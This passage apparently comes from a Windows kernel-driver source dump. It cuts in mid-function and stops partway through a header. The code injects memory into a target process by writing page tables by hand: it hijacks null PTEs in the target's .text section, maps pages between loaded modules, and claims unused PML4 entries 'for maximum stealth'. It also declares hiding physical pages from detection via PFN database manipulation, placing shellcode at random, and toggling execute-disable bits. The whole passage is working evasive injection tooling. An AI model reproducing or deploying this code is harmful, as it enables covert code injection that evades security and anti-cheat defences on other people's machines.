      physical::read_physical_address(pml4_phys + helper.AsIndex.Pml4 * sizeof(PML4E_64), &pml4e,
                                      sizeof(PML4E_64));

      if (!pml4e.Present)
        continue;

      PDPTE_64 pdpte = {0};
      physical::read_physical_address(PFN_TO_PAGE(pml4e.PageFrameNumber) +
                                          helper.AsIndex.Pdpt * sizeof(PDPTE_64),
                                      &pdpte, sizeof(PDPTE_64));

      if (!pdpte.Present)
        continue;

      PDE_64 pde = {0};
      physical::read_physical_address(PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                          helper.AsIndex.Pd * sizeof(PDE_64),
                                      &pde, sizeof(PDE_64));

      if (!pde.Present)
        continue;

      PTE_64 pte = {0};
      physical::read_physical_address(PFN_TO_PAGE(pde.PageFrameNumber) +
                                          helper.AsIndex.Pt * sizeof(PTE_64),
                                      &pte, sizeof(PTE_64));

      if (pte.PageFrameNumber == 0) {
        uintptr_t potential_start = current_va;
        size_t available_size = 0;

        while (available_size < aligned_size && current_va < text_section_end) {
          helper.AsUInt64 = current_va;

          physical::read_physical_address(pml4_phys + helper.AsIndex.Pml4 * sizeof(PML4E_64),
                                          &pml4e, sizeof(PML4E_64));
          if (!pml4e.Present)
            break;

          physical::read_physical_address(PFN_TO_PAGE(pml4e.PageFrameNumber) +
                                              helper.AsIndex.Pdpt * sizeof(PDPTE_64),
                                          &pdpte, sizeof(PDPTE_64));
          if (!pdpte.Present)
            break;

          physical::read_physical_address(PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                              helper.AsIndex.Pd * sizeof(PDE_64),
                                          &pde, sizeof(PDE_64));
          if (!pde.Present)
            break;

          physical::read_physical_address(PFN_TO_PAGE(pde.PageFrameNumber) +
                                              helper.AsIndex.Pt * sizeof(PTE_64),
                                          &pte, sizeof(PTE_64));

          if (pte.PageFrameNumber == 0) {
            available_size += PAGE_SIZE;
            current_va += PAGE_SIZE;
          } else {
            break;
          }
        }

        if (available_size >= aligned_size) {
          base_va = potential_start;
          log("SUCCESS",
              "found suitable empty/null page range within .text section at "
              "0x%llx with size 0x%llx",
              base_va, available_size);
          break;
        }
      }
    }

    if (!base_va) {
      log("ERROR", "could not find suitable empty/null page range in .text section");
      return nullptr;
    }

    log("INFO", "selected base address: 0x%llx", base_va);

    auto write_pt_status =
        mem::write_page_tables(target_dir_base, base_va, page_count, NORMAL_PAGE);

    if (!NT_SUCCESS(write_pt_status)) {
      log("ERROR", "failed to write page tables");
      return nullptr;
    }

    return reinterpret_cast<void*>(base_va);
  }

  /**
   * @brief Find unused virtual address space between loaded modules
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @return Virtual address in target process, or nullptr on failure
   *
   * Enumerates loaded modules and finds gaps in virtual address space large
   * enough for the requested allocation, then maps hidden pages at that location.
   */
  auto allocate_between_modules(const uint32_t local_pid, const uint32_t target_pid,
                                const size_t size) -> void* {
    const size_t page_mask = PAGE_SIZE - 1;
    const size_t aligned_size = (size + page_mask) & ~page_mask;
    const size_t page_count = aligned_size >> PAGE_SHIFT;

    log("INFO", "searching for space of size 0x%llx (%d pages)", aligned_size, page_count);

    PEPROCESS target_process = nullptr;
    if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(target_pid),
                                                 &target_process) != STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target process");
      return nullptr;
    }

    // RAII will handle cleanup
    raii::process_ref process_ref(target_process, "EPROCESS");

    const auto target_dir_base = physical::get_process_directory_base(target_process);
    if (!target_dir_base) {
      log("ERROR", "failed to lookup target process directory base");
      return nullptr;
    }

    PPEB peb_address = globals::ps_get_process_peb(target_process);
    if (!peb_address) {
      log("ERROR", "failed to get PEB address");
      return nullptr;
    }

    PEB peb;
    physical::read_process_memory(target_process, reinterpret_cast<uintptr_t>(peb_address), &peb,
                                  sizeof(PEB));
    log("INFO", "PEB found at 0x%llx", peb_address);

    PEB_LDR_DATA ldr_data;
    physical::read_process_memory(target_process, reinterpret_cast<uintptr_t>(peb.Ldr), &ldr_data,
                                  sizeof(PEB_LDR_DATA));

    PLIST_ENTRY current_entry = ldr_data.InMemoryOrderModuleList.Flink;
    PLIST_ENTRY first_entry = current_entry;
    uintptr_t base_va = 0;

    uintptr_t last_module_end = 0;
    int module_count = 0;

    do {
      LDR_DATA_TABLE_ENTRY entry;
      physical::read_process_memory(target_process,
                                    reinterpret_cast<uintptr_t>(CONTAINING_RECORD(
                                        current_entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)),
                                    &entry, sizeof(LDR_DATA_TABLE_ENTRY));

      if (entry.DllBase && (entry.Flags & 0x00000004)) {
        uintptr_t current_module_start = reinterpret_cast<uintptr_t>(entry.DllBase);

        log("INFO", "module %d: base: 0x%llx, Size: 0x%llx", module_count++, current_module_start,
            entry.SizeOfImage);

        if (last_module_end) {
          uintptr_t gap_start = last_module_end;
          while (gap_start % 0x10000 != 0) {
            gap_start += 1;
          }

          uintptr_t gap_size = current_module_start - gap_start;

          log("INFO", "gap found: start: 0x%llx, size: 0x%llx", gap_start, gap_size);

          if (gap_size >= aligned_size) {
            base_va = gap_start;
            log("SUCCESS", "found suitable gap at 0x%llx with size 0x%llx", gap_start, gap_size);
            break;
          }
        }

        last_module_end = current_module_start + entry.SizeOfImage;
        log("INFO", "module ends at 0x%llx", last_module_end);
      }

      current_entry = entry.InMemoryOrderLinks.Flink;
    } while (current_entry != first_entry);

    if (!base_va) {
      log("ERROR", "could not find suitable space between modules after checking %d modules",
          module_count);
      return nullptr;
    }

    log("INFO", "selected base address: 0x%llx", base_va);

    auto write_pt_status =
        mem::write_page_tables(target_dir_base, base_va, page_count, NORMAL_PAGE);

    if (!NT_SUCCESS(write_pt_status)) {
      log("ERROR", "failed to write page tables");
      return nullptr;
    }

    return reinterpret_cast<void*>(base_va);
  }

  /**
   * @brief Allocate memory using unused PML4 entries for maximum stealth
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @param mem_type Whether to use 4KB, 2MB or 1GB pages
   * @param use_high_address Whether to use kernel-space (high) or user-space
   * (low) addresses
   * @return Virtual address in target process, or nullptr on failure
   *
   * Finds non-present PML4 entries and creates entirely new virtual address
   * spaces with base address entropy for maximum stealth.
   */
  auto allocate_at_non_present_pml4e(const uint32_t local_pid, const uint32_t target_pid,
                                     const size_t size, const memory_type mem_type,
                                     const bool use_high_address) -> void* {
    const size_t STANDARD_PAGE_SIZE = 0x1000;  // 4KB
    const size_t LARGE_PAGE_SIZE = 0x200000;   // 2MB
    const size_t HUGE_PAGE_SIZE = 0x40000000;  // 1GB

    const size_t page_size = (mem_type == memory_type::HUGE_PAGE)    ? HUGE_PAGE_SIZE
                             : (mem_type == memory_type::LARGE_PAGE) ? LARGE_PAGE_SIZE
                                                                     : STANDARD_PAGE_SIZE;
    const size_t page_mask = page_size - 1;
    const size_t page_shift = (mem_type == memory_type::HUGE_PAGE)    ? 30
                              : (mem_type == memory_type::LARGE_PAGE) ? 21
                                                                      : 12;

    const size_t aligned_size = (size + page_mask) & ~page_mask;
    const size_t page_count = aligned_size >> page_shift;

    PEPROCESS target_process = nullptr;
    if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(target_pid),
                                                 &target_process) != STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target process");
      return nullptr;
    }

    // RAII will handle cleanup
    raii::process_ref process_ref(target_process, "EPROCESS");

    if (!validation::validate_process_state(target_process, target_pid)) {
      return nullptr;
    }

    if (!validation::acquire_process_rundown_protection(target_process, target_pid)) {
      return nullptr;
    }

    const auto target_dir_base = physical::get_process_directory_base(target_process);
    if (!target_dir_base) {
      log("ERROR", "failed to lookup target process directory base");
      return nullptr;
    }

    if (!validation::is_physical_address_valid(target_dir_base)) {
      validation::release_process_rundown_protection(target_process);
      auto dir_base_pfn = PAGE_TO_PFN(target_dir_base);
      log("ERROR", "directory base PFN 0x%llx outside valid range [0x%llx-0x%llx]", dir_base_pfn,
          globals::mm_lowest_physical_page, globals::mm_highest_physical_page);
      return nullptr;
    }

    uint32_t start_idx, end_idx;
    const char* space_type;
    page_table::get_pml4_search_range(use_high_address, &start_idx, &end_idx, &space_type);

    if (!validation::validate_index_range(start_idx, end_idx, "PML4")) {
      validation::release_process_rundown_protection(target_process);
      return nullptr;
    }

    auto selection = page_table::select_random_available_pml4(
        target_dir_base, start_idx, end_idx, (uintptr_t)target_process ^ target_pid);

    if (!selection.success) {
      validation::release_process_rundown_protection(target_process);
      log("ERROR", "failed to find any non-present PML4E in %s space", space_type);
      return nullptr;
    }

    uintptr_t base_va = page_table::construct_randomized_virtual_address(
        selection.selected_index, use_high_address, mem_type);

    log("INFO", "selected base address: 0x%llx for %s pages", base_va,
        mem_type == memory_type::HUGE_PAGE    ? "1GB"
        : mem_type == memory_type::LARGE_PAGE ? "2MB"
                                              : "4KB");

    auto write_pt_status = mem::write_page_tables(target_dir_base, base_va, page_count, mem_type);
    if (!NT_SUCCESS(write_pt_status)) {
      validation::release_process_rundown_protection(target_process);
      log("ERROR", "failed to write page tables, NTSTATUS: 0x%08X", write_pt_status);
      return nullptr;
    }

    validation::release_process_rundown_protection(target_process);
    return reinterpret_cast<void*>(base_va);
  }

}  // namespace mem
```

`driver/mem/mem.hpp`:

```hpp
#pragma once

namespace mem {

  /**
   * @brief Safely copy memory between virtual addresses within the current
   * process
   * @param dst Destination buffer
   * @param src Source buffer
   * @param size Number of bytes to copy
   * @return true if copy succeeded and all bytes were transferred, false
   * otherwise
   *
   * Uses MmCopyVirtualMemory for safe memory transfers.
   */
  bool safe_copy(void* const dst, void* const src, const size_t size);

  /**
   * @brief Validate user-mode address alignment and bounds
   * @param addr Address to validate
   * @param size Size of the memory region
   * @param alignment Required alignment (must be power of 2)
   * @return true if address is valid, false if invalid or out of bounds
   *
   * Checks if an address is properly aligned, within user-mode bounds, and
   * doesn't overflow.
   */
  auto probe_user_address(PVOID const addr, const SIZE_T size, const ULONG alignment) -> bool;

  /**
   * @brief Locate a loaded driver's base address by module name
   * @param module_name ANSI string name of the module to find
   * @return Base address of the module, or nullptr if not found
   *
   * Searches the PsLoadedModuleList to find a driver by name and returns its base
   * address.
   */
  auto get_driver_base(LPCSTR const module_name) -> void*;

  /**
   * @brief Apply stealth techniques to hide physical memory pages from detection
   * @param page_frame_number The PFN of the page to hide
   * @param type The hiding technique to apply
   * @return true if hiding succeeded, false otherwise
   *
   * Implements various memory hiding techniques via MmPfnDatabase manipulation
   */
  auto hide_physical_memory(uintptr_t page_frame_number, hide_type type, bool lock_page = false)
      -> bool;

  /**
   * @brief Allocate independent physical pages with stealth hiding applied
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates non-contiguous physical pages and applies configured hiding
   * techniques. Memory is hidden according to global settings.
   */
  auto allocate_independent_pages(size_t size) -> void*;

  /**
   * @brief Allocate secure kernel pages
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   */
  auto allocate_secure_kernel_pages(size_t size) -> void*;

  /**
   * @brief Allocate contiguous physical memory with stealth hiding applied
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates physically contiguous memory block and applies hiding techniques.
   * Handles both regular and large page allocations.
   */
  auto allocate_contiguous_memory(size_t size) -> void*;

  /**
   * @brief Manually construct page table entries for a virtual address range
   * @param target_dir_base Physical address of target process PML4
   * @param base_va Base virtual address to map
   * @param page_count Number of pages to map
   * @param use_large_page Whether to use 2MB large pages instead of 4KB pages
   * @return NTSTATUS indicating success or failure
   *
   * Creates complete page table hierarchy (PML4E->PDPTE->PDE->PTE) for manual
   * memory mapping. Supports both 4KB and 2MB page sizes with proper cache
   * flushing after each page table modification to ensure coherency and locking to prevent paging
   * to disk.
   */
  auto write_page_tables(uintptr_t target_dir_base, uintptr_t base_va, size_t page_count,
                         memory_type mem_type) -> NTSTATUS;
  /**
   * @brief Hijack null/empty PTEs within a process's .text section
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @param use_large_page Whether to use 2MB pages
   * @return Virtual address in target process, or nullptr on failure
   *
   * Scans the target process's main module .text section for PTEs with null page
   * frame numbers and replaces them with hidden physical pages. Dangerous
   * technique that may cause instability.
   */
  auto hijack_null_pfn(const uint32_t local_pid, const uint32_t target_pid, const size_t size)
      -> void*;

  /**
   * @brief Find unused virtual address space between loaded modules
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @param use_large_page Whether to use 2MB pages
   * @return Virtual address in target process, or nullptr on failure
   *
   * Enumerates loaded modules and finds gaps in virtual address space large
   * enough for the requested allocation, then maps hidden pages at that location.
   */
  auto allocate_between_modules(const uint32_t local_pid, const uint32_t target_pid,
                                const size_t size) -> void*;

  /**
   * @brief Allocate memory using unused PML4 entries for maximum stealth
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @param use_large_page Whether to use 2MB pages
   * @param use_high_address Whether to use kernel-space (high) or user-space
   * (low) addresses
   * @return Virtual address in target process, or nullptr on failure
   *
   * Finds non-present PML4 entries and creates entirely new virtual address
   * spaces with base address entropy for maximum stealth.
   */
  auto allocate_at_non_present_pml4e(const uint32_t local_pid, const uint32_t target_pid,
                                     const size_t size, const memory_type mem_type,
                                     const bool use_high_address) -> void*;

}  // namespace mem
```

`driver/mem/page_table.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
#include "../utils/intrin.hpp"
#include "phys.hpp"
namespace page_table {

  /**
   * @brief Flush all Translation Lookaside Buffers and processor caches
   *
   * Performs a complete TLB flush and cache invalidation across all processors.
   * This ensures memory mappings and cached data are refreshed after page table
   * modifications.
   */
  auto flush_tlb() -> void {
    globals::ke_flush_entire_tb(TRUE, TRUE);
    globals::ke_invalidate_all_caches();
    globals::mi_flush_entire_tb_due_to_attribute_change();
  }

  /**
   * @brief Intelligently flush caches and TLB for a specific memory address
   *
   * Performs comprehensive cache and Translation Lookaside Buffer (TLB)
   * invalidation for a specific memory address. Uses optimal flushing strategy
   * based on CPU features.
   *
   * @param address Virtual address to flush from caches and TLB
   *
   * @details
   * This function performs the following operations in sequence:
   * 1. **Smart TLB Flushing**:
   *    - If PCID or Global Pages are enabled: Toggles PGE bit to flush global TLB
   * entries
   *    - Otherwise: Reloads CR3 to flush entire TLB (preserves global pages if
   * PGE set)
   * 2. **Cache Invalidation**: Forces all dirty cache lines to memory and
   * invalidates CPU caches
   * 3. **Page-Specific Invalidation**: Removes the specific virtual address from
   * TLB
   *
   * @note This is a heavy operation that flushes ALL processor caches. Use
   * sparingly.
   * @warning Should be called after direct page table modifications to ensure
   * cache coherency
   *
   * @see CR4 control register documentation for PCID and PGE details
   * @see Intel Software Developer Manual Vol 3A, Section 4.10 for TLB management
   */
  void flush_caches(void* address) {
    _mm_mfence();

    globals::ke_flush_entire_tb(TRUE, TRUE);  //  ( cr3/cr4 rewrite on all cores )
    globals::ke_invalidate_all_caches();      // ( __wbinvd on all cores )
    globals::ke_flush_single_tb(reinterpret_cast<uintptr_t>(address), 0,
                                1);  // ( __invlpg on all cores )

    _mm_mfence();
  }

  /**
   * @brief Convert a virtual address to its corresponding physical address
   * @param virtual_address The virtual address to translate
   * @return PHYSICAL_ADDRESS structure containing the physical address, or 0 if
   * translation fails
   *
   * Uses the Memory Manager's PTE resolution to perform virtual-to-physical
   * address translation. Returns zero physical address if the page is not present
   * or the PTE is invalid.
   */
  auto virtual_to_physical(void* virtual_address) -> PHYSICAL_ADDRESS {
    PHYSICAL_ADDRESS physical_address{0};
    const uintptr_t va = reinterpret_cast<uintptr_t>(virtual_address);

    PTE_64* const pte = reinterpret_cast<PTE_64*>(globals::mi_get_pte_address(va));
    if (!pte || !pte->Present) {
      return physical_address;
    }

    const uintptr_t pfn = pte->PageFrameNumber;
    physical_address.QuadPart = (pfn << PAGE_SHIFT) | (va & 0xFFF);

    return physical_address;
  }
  /**
   * @brief Retrieve page table entry information for a given virtual address
   * @param va Virtual address to analyze
   * @param cr3 CR3 register value containing the page directory base
   * @return PAGE_INFORMATION structure containing pointers to relevant page table
   * entries
   *
   * Walks the page table hierarchy to locate and return pointers to the PML4E,
   * PDPTE, PDE, and PTE entries for a virtual address. Handles large pages and
   * stops traversal early when encountering non-present entries or large page
   * mappings.
   */
  auto get_page_information(const void* va, const CR3 cr3) -> PAGE_INFORMATION {
    ADDRESS_TRANSLATION_HELPER helper;
    UINT32 level;
    PML4E_64 *pml4, *pml4e;
    PDPTE_64 *pdpt, *pdpte;
    PDE_64 *pd, *pde;
    PTE_64 *pt, *pte;

    PAGE_INFORMATION info;

    helper.AsUInt64 = reinterpret_cast<uintptr_t>(va);

    PHYSICAL_ADDRESS pa;

    pa.QuadPart = PFN_TO_PAGE(cr3.AddressOfPageDirectory);

    pml4 = reinterpret_cast<PML4E_64*>(globals::mm_get_virtual_for_physical(pa));

    pml4e = &pml4[helper.AsIndex.Pml4];

    info.PML4E = pml4e;

    if (pml4e->Present == FALSE) {
      info.PTE = nullptr;
      info.PDE = nullptr;
      info.PDPTE = nullptr;

      goto end;
    }

    pa.QuadPart = PFN_TO_PAGE(pml4e->PageFrameNumber);

    pdpt = reinterpret_cast<PDPTE_64*>(globals::mm_get_virtual_for_physical(pa));

    pdpte = &pdpt[helper.AsIndex.Pdpt];

    info.PDPTE = pdpte;

    if ((pdpte->Present == FALSE) || (pdpte->LargePage != FALSE)) {
      info.PTE = nullptr;
      info.PDE = nullptr;

      goto end;
    }

    pa.QuadPart = PFN_TO_PAGE(pdpte->PageFrameNumber);

    pd = reinterpret_cast<PDE_64*>(globals::mm_get_virtual_for_physical(pa));

    pde = &pd[helper.AsIndex.Pd];

    info.PDE = pde;

    if ((pde->Present == FALSE) || (pde->LargePage != FALSE)) {
      info.PTE = nullptr;

      goto end;
    }

    pa.QuadPart = PFN_TO_PAGE(pde->PageFrameNumber);

    pt = reinterpret_cast<PTE_64*>(globals::mm_get_virtual_for_physical(pa));

    pte = &pt[helper.AsIndex.Pt];

    info.PTE = pte;

    return info;

  end:
    return info;
  }

  /**
   * @brief Find random unused space within a memory section for shellcode
   * placement
   * @param base Base address of the section to scan
   * @param section_size Total size of the section in bytes
   * @param shell_size Required size for the shellcode
   * @return Pointer to a randomly selected free space, or nullptr if none found
   *
   * Scans for contiguous zero-byte regions large enough to hold shellcode and
   * randomly selects one to avoid predictable placement patterns.
   */
  auto find_unused_space(void* base, uint32_t section_size, size_t shell_size)
      -> void*  // kinda pointless method to find unused space throughout .data
                // section and picking a random start address out of every usable
                // space it found
  {
    auto* data_section = static_cast<uint8_t*>(base);
    void* free_spaces[MAX_FREE_SPACES];
    uint32_t free_space_count = 0;

    // find all suitable free spaces
    for (uint32_t i = 0; i <= section_size - shell_size;) {
      bool found_space = true;
      size_t largest_fit = 0;

      // check for free space starting at i
      for (size_t j = 0; j < shell_size; ++j) {
        if (data_section[i + j] != 0x00) {
          found_space = false;
          break;
        }
      }

      // if we found free space, determine how large the free block is
      if (found_space) {
        largest_fit = shell_size;

        // determine the largest block that can fit starting from i
        for (size_t j = shell_size; i + j < section_size; ++j) {
          if (data_section[i + j] != 0x00) {
            break;  // stop when we encounter a non-zero byte
          }
          largest_fit = j + 1;  // adjust largest size that can fit
        }

        // store the adjusted starting address
        if (free_space_count < MAX_FREE_SPACES) {
          free_spaces[free_space_count++] = &data_section[i];
          log("INFO",
              "found free space at: %p, marking range from start address 0x%p to "
              "end address 0x%p ( max shell size that can fit: %zu )",
              &data_section[i], &data_section[i], &data_section[i + largest_fit], largest_fit);
        } else {
          log("WARNING", "too many free spaces found, increase MAX_FREE_SPACES.");
          break;
        }

        // move i forward by the largest shell size found to avoid overlap
        i += largest_fit;
      } else {
        // move to the next address if no space is found at the current location
        ++i;
      }
    }

    // if no free space was found, return nullptr
    if (free_space_count == 0) {
      log("ERROR", "no free space found");
      return nullptr;
    }

    // choose one starting address randomly from above
    LARGE_INTEGER seed;
    globals::ke_query_system_time_precise(&seed);
    uint32_t random_index = static_cast<uint32_t>(seed.QuadPart % free_space_count);
    void* chosen_space = free_spaces[random_index];

    log("INFO", "chosen starting address: 0x%p", chosen_space);

    return chosen_space;
  }

  /**
   * @brief Locate a specific section within a PE image
   * @param base Base address of the PE image
   * @param size Output parameter for the section's virtual size
   * @param section_name Name of the section to find (e.g., ".text", ".data")
   * @param section_name_len Length of the section name string
   * @return Virtual address of the section, or nullptr if not found
   *
   * Parses PE headers to locate a named section and returns its virtual address
   * and size.
   */
  auto find_section_base(void* base, uint32_t* size, const char* section_name,
                         size_t section_name_len) -> void* {
    const auto* dos_header = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    const auto* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        reinterpret_cast<const uint8_t*>(base) + dos_header->e_lfanew);

    const auto* section = IMAGE_FIRST_SECTION(nt_headers);

    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i, ++section) {
      if (!globals::strncmp(reinterpret_cast<const char*>(section->Name), section_name,
                            section_name_len)) {
        *size = section->Misc.VirtualSize;
        return reinterpret_cast<uint8_t*>(base) + section->VirtualAddress;
      }
    }

    return nullptr;
  }

  /**
   * @brief Modify page table entries to change memory protection attributes
   * @param address Starting virtual address of the memory range
   * @param size Size of the memory range in bytes
   * @param execute_disable Whether to set the Execute Disable (NX) bit
   * @return true if at least one PTE was successfully modified, false otherwise
   *
   * Iterates through pages in the specified range and modifies their PTEs or PDEs
   * to change execution permissions. Handles both regular 4KB pages and 2MB large
   * pages.
   */
  auto spoof_pte_range(const uintptr_t address, const size_t size, const bool execute_disable)
      -> bool {
    CR3 cr3;
    cr3.Flags = intrin::readcr3();
    log("INFO", "CR3 Value: 0x%llx, Page Directory Base: 0x%llx", cr3.Flags,
        cr3.AddressOfPageDirectory);

    bool success = false;
    const auto pages = (size + 0xFFF) >> PAGE_SHIFT;
    log("INFO", "number of pages to process: %zu", pages);

    for (size_t i = 0; i < pages; ++i) {
      const auto current_va = address + i * 0x1000;
      log("INFO", "processing VA: 0x%llx", current_va);

      auto page_info = get_page_information(reinterpret_cast<void*>(current_va), cr3);

      auto pte = page_info.PTE;
      if (pte) {
        if (pte->Present) {
          pte->ExecuteDisable = execute_disable;

          log("INFO", "modified PTE - Write: %d, ExecuteDisable: %d", pte->Write,
              pte->ExecuteDisable);

          success = true;
        } else {
          log("ERROR", "PTE not present for VA: 0x%llx", current_va);
        }
      } else {
        log("ERROR", "PTE is null for VA: 0x%llx", current_va);
      }

      auto pde = page_info.PDE;
      if (pde) {
        if (pde->Present && pde->LargePage) {
          pde->ExecuteDisable = execute_disable;

          log("INFO", "modified pde - Write: %d, ExecuteDisable: %d", pde->Write,
              pde->ExecuteDisable);

          success = true;
        } else {
          log("ERROR", "pde not present for VA: 0x%llx", current_va);
        }
      } else {
        log("ERROR", "pde is null for VA: 0x%llx", current_va);
      }
    }

    if (success) {
      log("INFO", "successfully modified PTEs");
    } else {
      log("ERROR", "failed to modify any PTEs");
    }

    return success;
  }

  /**
   * @brief Calculate virtual address component for PML4 entry index
   * @param pml4_idx PML4 table index (0-511)
   * @return Virtual address bits corresponding to the PML4 index (bits 47-39)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pml4e(uint32_t pml4_idx) {
    return static_cast<uintptr_t>(pml4_idx) << 39;
  }

  /**
   * @brief Calculate virtual address component for PDPT entry index
   * @param pdpt_idx PDPT table index (0-511)
   * @return Virtual address bits corresponding to the PDPT index (bits 38-30)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pdpt(uint32_t pdpt_idx) {
    return static_cast<uintptr_t>(pdpt_idx) << 30;
  }

  /**
   * @brief Calculate virtual address component for PD entry index
   * @param pd_idx PD table index (0-511)
   * @return Virtual address bits corresponding to the PD index (bits 29-21)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pd(uint32_t pd_idx) {
    return static_cast<uintptr_t>(pd_idx) << 21;
  }

  /**
   * @brief Calculate virtual address component for PT entry index
   * @param pt_idx PT table index (0-511)
   * @return Virtual address bits corresponding to the PT index (bits 20-12)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pt(uint32_t pt_idx) {
    return static_cast<uintptr_t>(pt_idx) << 12;
  }

  /**
   * @brief Structure to hold the result of random PML4 index selection
   */
  struct PML4_SELECTION_RESULT {
    uint32_t selected_index;
    uint32_t available_count;
    bool success;
  };

  /**
   * @brief Find and randomly select an available (non-present) PML4 entry
   * @param dir_base Physical address of the page directory base (CR3)
   * @param start_idx Starting PML4 index to search from
   * @param end_idx Ending PML4 index to search to (exclusive)
   * @param seed_data Additional data to use for random seed generation
   * @return PML4_SELECTION_RESULT containing the selected index and metadata
   *
   * Scans the specified range of PML4 entries to find non-present ones,
   * then randomly selects one for allocation. Uses time and process info
   * for entropy in the random selection.
   */
  auto select_random_available_pml4(uintptr_t dir_base, uint32_t start_idx, uint32_t end_idx,
                                    uintptr_t seed_data = 0) -> PML4_SELECTION_RESULT {
    PML4_SELECTION_RESULT result = {0, 0, false};

    // validate index ranges
    if (start_idx >= end_idx || end_idx > 512) {
      log("ERROR", "invalid PML4 index range: [%u, %u)", start_idx, end_idx);
      return result;
    }

    // count available (non-present) PML4 entries
    PML4E_64 pml4e = {0};
    for (uint32_t idx = start_idx; idx < end_idx; idx++) {
      auto read_status = physical::read_physical_address(dir_base + idx * sizeof(PML4E_64), &pml4e,
                                                         sizeof(PML4E_64));
      if (!NT_SUCCESS(read_status)) {
        log("ERROR", "failed to read PML4E at index %u, status: 0x%08X", idx, read_status);
        return result;
      }

      if (!pml4e.Present) {
        result.available_count++;
      }
    }

    if (result.available_count == 0) {
      log("ERROR", "no available PML4E entries found in range [%u, %u)", start_idx, end_idx);
      return result;
    }

    // initialize random seed if not already done
    static bool seeded = false;
    if (!seeded) {
      LARGE_INTEGER time;
      globals::ke_query_system_time_precise(&time);
      globals::srand((unsigned int)(time.QuadPart ^ seed_data));
      seeded = true;
    }

    // select a random available entry
    uint32_t target_choice = globals::rand() % result.available_count;
    uint32_t current_choice = 0;

    for (uint32_t idx = start_idx; idx < end_idx; idx++) {
      auto read_status = physical::read_physical_address(dir_base + idx * sizeof(PML4E_64), &pml4e,
                                                         sizeof(PML4E_64));
      if (!NT_SUCCESS(read_status)) {
        log("ERROR", "failed to read PML4E during selection at index %u, status: 0x%08X", idx,
            read_status);
        return result;
      }

      if (!pml4e.Present) {
        if (current_choice == target_choice) {
          result.selected_index = idx;
          result.success = true;
          log("INFO", "found %u available PML4E indices, randomly selected index: %u",
              result.available_count, result.selected_index);
          return result;
        }
        current_choice++;
      }
    }

    log("ERROR", "failed to select random PML4E index (should not reach here)");
    return result;
  }

  /**
   * @brief Generate randomized address offset within a PML4E's address space
   * @param use_large_page Whether using 2MB large pages or 4KB pages
   * @return Randomized offset to add entropy to the base address
   *
   * Adds randomization at the appropriate page table level:
   * - Large pages (2MB): Randomizes PDPTE selection (bits 30-38, 1GB regions)
   * - Small pages (4KB): Randomizes PDE selection (bits 21-29, 2MB regions)
   */
  auto generate_address_entropy(memory_type mem_type) -> uint64_t {
    switch (mem_type) {
      case memory_type::HUGE_PAGE:
        // For 2MB large pages, randomize PDPTE selection (each PDPTE covers 1GB)
        return (static_cast<uint64_t>(globals::rand() % 512) << 30);
      case memory_type::LARGE_PAGE:
        // For 2MB large pages, randomize PDPTE selection (each PDPTE covers 1GB)
        return (static_cast<uint64_t>(globals::rand() % 512) << 30);

      case memory_type::NORMAL_PAGE:
      default:
        // For 4KB pages, randomize PDE selection (each PDE covers 2MB)
        return (static_cast<uint64_t>(globals::rand() % 512) << 21);
    }
  }

  /**
   * @brief Helper to determine PML4 search range based on address space preference
   * @param use_high_address Whether to use kernel-space (high) or user-space (low) addresses
   * @param start_idx Output parameter for starting index
   * @param end_idx Output parameter for ending index
   * @param space_type Output parameter for descriptive string
   */
  auto get_pml4_search_range(bool use_high_address, uint32_t* start_idx, uint32_t* end_idx,
                             const char** space_type) -> void {
    if (use_high_address) {
      *start_idx = 256;
      *end_idx = 511;
      *space_type = "kernel";
    } else {
      *start_idx = 100;
      *end_idx = 256;
      *space_type = "usermode";
    }
  }

  /**
   * @brief Construct a complete virtual address with randomization
   * @param selected_pml4_index The selected PML4 table index
   * @param use_high_address Whether this is a kernel-space address
   * @param use_large_page Whether using large pages for entropy calculation
   * @return Complete virtual address with base address and entropy
   */
  auto construct_randomized_virtual_address(uint32_t selected_pml4_index, bool use_high_address,
                                            memory_type mem_type) -> uintptr_t {
    uint64_t additional_offset = generate_address_entropy(mem_type);
    uintptr_t base_va;

    if (use_high_address) {
      base_va = 0xFFFF000000000000ULL | get_pml4e(selected_pml4_index) | additional_offset;
    } else {
      base_va = get_pml4e(selected_pml4_index) | additional_offset;
    }

    return base_va;
  }

}  // namespace page_table
```

`driver/mem/page_table.hpp`:

```hpp
#pragma once
#include <ntifs.h>

namespace page_table {

  /**
   * @brief Flush all Translation Lookaside Buffers and processor caches
   *
   * Performs a complete TLB flush and cache invalidation across all processors.
   * This ensures memory mappings and cached data are refreshed after page table
   * modifications.
   */
  auto flush_tlb() -> void;

  /**
   * @brief Intelligently flush caches and TLB for a specific memory address
   *
   * Performs comprehensive cache and Translation Lookaside Buffer (TLB)
